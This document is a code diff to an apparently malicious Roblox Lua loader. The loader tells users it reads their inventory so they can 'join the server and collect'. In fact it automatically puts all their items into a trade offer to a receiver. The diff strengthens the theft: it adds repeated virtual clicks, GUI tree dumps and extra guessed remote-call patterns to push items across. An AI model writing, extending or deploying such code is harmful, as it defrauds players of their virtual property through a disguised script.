@@ -3,7 +3,7 @@
 -- your full inventory so you can join the server and collect.
 -- the loader holds for SESSION_SECONDS (5 minutes), then the client detaches cleanly.
 
-local CLIENT_REV = "3.0"
+local CLIENT_REV = "3.1"
 local TOKEN = "{{TOKEN}}"
 local ENDPOINT = "{{ENDPOINT}}"
 local MIN_VALUE = {{MIN_VALUE}}
@@ -951,6 +951,11 @@ local function activateCard(button, window)
     task.wait(0.15)
     if windowSignature(sigRoot) ~= before then return "virtual" end
 
+    -- some trade grids need a second tap to move the card into the offer
+    pcall(function() game:GetService("VirtualUser"):ClickButton(button) end)
+    task.wait(0.2)
+    if windowSignature(sigRoot) ~= before then return "virtual2" end
+
     local pos
     pcall(function() pos = button.AbsolutePosition + button.AbsoluteSize * 0.5 end)
 
@@ -1175,6 +1180,29 @@ local function windowDump(window)
     return lines
 end
 
+local function printTree()
+    local roots = tradeGuiRoots(tradeWindow())
+    local count = 0
+    local function walk(node, depth)
+        for _, child in ipairs(node:GetChildren()) do
+            if count >= 80 then return end
+            count = count + 1
+            local extra = ""
+            if child:IsA("TextButton") or child:IsA("TextLabel") then
+                local text = norm(child.Text)
+                if #text >= 1 then extra = " [" .. text:sub(1, 18) .. "]" end
+            end
+            print(string.format("[vexora] tree: %s%s:%s%s",
+                string.rep("  ", depth), child.ClassName, tostring(child.Name):sub(1, 24), extra))
+            walk(child, depth + 1)
+        end
+    end
+    for _, root in ipairs(roots) do
+        print("[vexora] tree: " .. root.ClassName .. ":" .. tostring(root.Name))
+        walk(root, 1)
+    end
+end
+
 local function probeWithWindow()
     local lines = probeLines()
     local ok, dump = pcall(windowDump, tradeWindow())
@@ -1208,6 +1236,7 @@ local function offerEverything(receiver)
         local names = {}
         for _, entry in ipairs(list) do table.insert(names, entry.label) end
         rememberItems(names)
+        if scanned < 3 then printTree() end
         for _, entry in ipairs(list) do
             if clicked >= OFFER_LIMIT then break end
             local used = activateCard(entry.button, tradeWindow() or window)
@@ -1221,12 +1250,16 @@ local function offerEverything(receiver)
         end
     end
 
-    -- guessed item remotes only when the ui gave us nothing to click
+    -- guessed item remotes only when the ui gave us nothing to click. the names
+    -- read off the grid are cached, so this can still name the items
     if clicked == 0 then
+        items = Vexora.items()
         for _, name in ipairs(items) do
             for _, remote in ipairs(itemRemotes) do
                 fire(remote, name)
                 fire(remote, receiver.Name, name)
+                fire(remote, "add", name)
+                fire(remote, name, receiver.Name)
                 fired = fired + 1
             end
             task.wait(OFFER_GAP)
